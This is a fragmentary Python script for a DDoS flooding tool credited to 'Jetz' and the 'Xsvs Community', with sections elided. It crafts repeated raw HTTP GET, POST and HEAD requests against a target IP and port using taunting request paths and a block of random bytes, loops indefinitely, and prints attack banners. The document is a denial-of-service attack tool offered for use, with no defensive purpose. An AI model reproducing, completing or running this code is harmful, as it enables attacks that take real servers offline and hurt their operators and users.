...
import time
import os
os.system('color ' +random.choice(['B'])+ " & cls & BOOSTER TOOLS DDOS V2 [ Enter Pass ]")
...
if sys.platform.startswith("linux"):
   ...
   os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Booster [ DDoS Attack ]")
print("=======================================================================================")
print("[ × ]  Xsvs Community [ × ]")
print("[ + ]  Tools Ddos by Jetz")
print("[ + ] DONT FORGET SUBSCRIBE JETZ TURU")
print("=======================================================================================")
print("[ + ] Author: Jetz")
print("[ + ] Update Tool: Xsvs Community")
print("==========================")
...
def Headers(method, referers=None):
    ...
    if method == "get" or method == "head":
        post_host = "POST /Your_Server_Got_DDoS_By_XSVSCOMMUNITY_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
...
os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Used By Xsvs Community [ DDoS Attack ]")
def run():
    header = Headers("get")
    i = random.choice(("[*]","[!]","[#]"))
    data = random._urandom(20179)
    if method_attack == "1":
        get_host = "GET /Your_Server_Got_DDoS_By_XSVSCOMMUNITY_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Your_Server_Got_DDoS_By_XSVS COMMUNITY_Will_NoSurrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
            ...
            s.close()
            print("[ + ] Xsvs Community Attacking Server IP => ",ip," In Port ",port,"!")
